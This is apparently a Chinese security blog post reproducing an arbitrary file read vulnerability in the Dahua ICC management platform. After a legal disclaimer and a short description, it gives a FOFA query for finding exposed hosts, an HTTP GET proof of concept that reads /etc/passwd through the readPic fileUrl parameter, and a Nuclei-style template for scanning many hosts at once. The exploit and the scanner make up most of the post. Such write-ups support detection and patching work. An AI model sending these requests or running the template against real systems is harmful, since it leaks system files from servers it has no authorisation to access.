# 原创
：  漏洞复现--大华ICC readpic任意文件读取漏洞

# 漏洞复现--大华ICC readpic任意文件读取漏洞

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负**

### 一：漏洞描述

ICC，即大华浩睿智能物联综合管理平台。<br/> 对技术组件进行模块化和松耦合，将解决方案分层分级，提高面向智慧物联的数据接入与生态合作能力。<br/> 该产品readpic存在任意文件读取漏洞

### 二：漏洞影响版本

大华ICC智能物联综合管理平台

### 三：网络空间测绘查询

fofa:<br/> `body="*客户端会小于800*"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0410abff57d7634a3f5c9bfab04b9a43.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/15f2f527292bb25cf947f284865f79bb.jpeg"/><br/> POC：

```
GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

```

### 五：批量检测

```

id: dahua-icc-readpic-anyfileread

info:
  name: 大华ICC readpic任意文件读取漏洞
  author: fgz
  severity: high
  description: |
    2021年大华全新发布的ICC架构下的基础停车业务系统，基于硬件+平台+服务能力，依托集中化管控模式，提供中大型园区集团化管理、多社区停车场联网等项目的集成应用，打造集停车场管理、运营和生态于一体的赋能平台，实现降本、增收、提效。大华ICC智能物联综合管理平台存在任意文件读取漏洞，会造成敏感信息泄露。
  tags: 2023,dahua,fileread
  metadata:
    max-request: 2
    fofa-query: body="*客户端会小于800*"
    verified: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"

```
